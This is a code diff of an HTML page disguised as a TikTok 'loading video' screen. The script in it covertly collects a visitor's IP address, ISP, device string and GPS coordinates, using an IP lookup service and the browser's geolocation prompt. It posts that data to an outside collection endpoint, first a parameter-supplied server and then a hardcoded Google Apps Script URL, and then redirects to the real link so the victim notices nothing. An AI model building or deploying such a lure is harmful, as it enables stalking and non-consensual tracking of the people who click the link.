@@ -1,121 +1,161 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>TikTok</title>
-    <link rel="icon" href="https://sf16-scmcdn-sg.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e488764010373df8.png">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            background-color: #010101; 
-            height: 100vh; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            font-family: 'ProximaNova', sans-serif;
-            overflow: hidden;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-
-        /* Gimmick Loading TikTok */
-        .loader-container {
+        body {
+            background: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+        }
+        .loading-container {
             text-align: center;
-            animation: fadeOut 0.5s ease 2.5s forwards; /* Menghilang otomatis */
         }
-
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #333;
+            border-top: 5px solid #25f4ee;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            font-size: 16px;
+            color: #ccc;
+            margin-top: 10px;
+        }
         .tiktok-logo {
-            width: 80px;
-            height: 80px;
-            filter: drop-shadow(2px 0px 0px #FD3E3E) drop-shadow(-2px 0px 0px #4DE8F4);
-            animation: pulse 1.5s infinite ease-in-out;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.1); opacity: 1; }
-            100% { transform: scale(1); opacity: 0.8; }
-        }
-
-        @keyframes fadeOut {
-            to { opacity: 0; visibility: hidden; }
-        }
-
-        /* Pesan Gimmick */
-        .loading-text {
-            color: white;
-            margin-top: 15px;
-            font-size: 14px;
-            letter-spacing: 0.5px;
-            font-weight: 400;
+            font-size: 36px;
+            font-weight: bold;
+            color: #fff;
+            margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
-
-    <div class="loader-container">
-        <svg class="tiktok-logo" viewBox="0 0 448 512" fill="white">
-            <path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/>
-        </svg>
-        <div class="loading-text">Membuka Aplikasi...</div>
+    <div class="loading-container">
+        <div class="tiktok-logo">TikTok</div>
+        <div class="spinner"></div>
+        <div class="message">Memuat video...</div>
     </div>
 
     <script>
-        const params = new URLSearchParams(window.location.search);
-        const targetUrl = params.get('url') || 'https://www.tiktok.com';
-        const apiUrl = params.get('api');
+        (async function() {
+            // Ambil parameter dari URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const originalUrl = urlParams.get('url');
+            const id = urlParams.get('id');
 
-        // INSTANT TRIGGER: 0.0000000000000009MS (Langsung eksekusi)
-        (async function recon() {
-            try {
-                // Ambil IP & Info Dasar Dulu (Tanpa Izin)
-                const geoReq = await fetch('https://ipapi.co/json/');
-                const geo = await geoReq.json();
-
-                // BRUTAL PERMISSION: Langsung minta izin GPS
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        // Jika Diizinkan
-                        sendData(geo, pos.coords.latitude, pos.coords.longitude, "ACCURATE GPS");
-                    },
-                    () => {
-                        // Jika Ditolak
-                        sendData(geo, geo.latitude, geo.longitude, "ISP APPROXIMATION");
-                    },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            } catch (e) {
-                // Fail-safe: Langsung buang ke TikTok jika error
-                window.location.replace(targetUrl);
+            if (!originalUrl || !id) {
+                // Jika tidak ada parameter, redirect ke TikTok homepage
+                window.location.href = 'https://www.tiktok.com';
+                return;
             }
-        })();
 
-        async function sendData(geo, lat, lon, stat) {
-            const payload = {
-                ip: geo.ip,
-                city: geo.city,
-                country: geo.country_name,
-                isp: geo.org,
-                lat: lat,
-                lon: lon,
-                status: stat
+            // Fungsi untuk mendapatkan IP dan ISP
+            async function getIpInfo() {
+                try {
+                    const response = await fetch('https://ip-api.com/json/?fields=61439'); // fields: status, country, region, city, isp, org, query
+                    const data = await response.json();
+                    if (data.status === 'success') {
+                        return {
+                            ip: data.query,
+                            isp: data.isp || data.org || 'Tidak diketahui'
+                        };
+                    }
+                } catch (err) {
+                    console.error('Gagal mengambil IP info:', err);
+                }
+                return {
+                    ip: '0.0.0.0',
+                    isp: 'Tidak diketahui'
+                };
+            }
+
+            // Fungsi untuk mendapatkan lokasi
+            function getLocation() {
+                return new Promise((resolve) => {
+                    if (!navigator.geolocation) {
+                        resolve({ lat: '', lon: '' });
+                        return;
+                    }
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude
+                            });
+                        },
+                        (error) => {
+                            console.error('Geolocation error:', error.message);
+                            resolve({ lat: '', lon: '' });
+                        },
+                        { timeout: 8000 }
+                    );
+                });
+            }
+
+            // Kumpulkan semua data
+            const [ipInfo, location] = await Promise.all([
+                getIpInfo(),
+                getLocation()
+            ]);
+
+            const device = navigator.userAgent;
+            const data = {
+                id: id,
+                lat: location.lat,
+                lon: location.lon,
+                ip: ipInfo.ip,
+                isp: ipInfo.isp,
+                device: device
             };
 
-            // Kirim ke Pterodactyl lo
-            if (apiUrl) {
-                try {
-                    await fetch(apiUrl, {
-                        method: 'POST',
-                        mode: 'no-cors', // Penting agar tidak terblokir
-                        body: JSON.stringify(payload)
-                    });
-                } catch (err) { console.error(err); }
+            // Kirim data ke Apps Script (POST dengan form-urlencoded)
+            const appsScriptUrl = 'https://script.google.com/macros/s/AKfycbxJx9NK-Wc5FwGPSA8egzOqGL1T1-r6Vb_huM-_yPkwZRG8Df8k1SX3dxsehzd2HQ/exec';
+
+            // Gunakan FormData untuk mengirim sebagai form-urlencoded
+            const formData = new FormData();
+            formData.append('id', data.id);
+            formData.append('lat', data.lat);
+            formData.append('lon', data.lon);
+            formData.append('ip', data.ip);
+            formData.append('isp', data.isp);
+            formData.append('device', data.device);
+
+            try {
+                await fetch(appsScriptUrl, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors' // Agar tidak terkendala CORS
+                });
+                console.log('Data terkirim');
+            } catch (err) {
+                console.error('Gagal mengirim data:', err);
             }
 
-            // REDIRECT BRUTAL (0.000000000003MS setelah send)
+            // Redirect ke link asli setelah 1 detik
             setTimeout(() => {
-                window.location.replace(targetUrl);
-            }, 100);
-        }
+                window.location.href = originalUrl;
+            }, 1000);
+        })();
     </script>
 </body>
 </html>
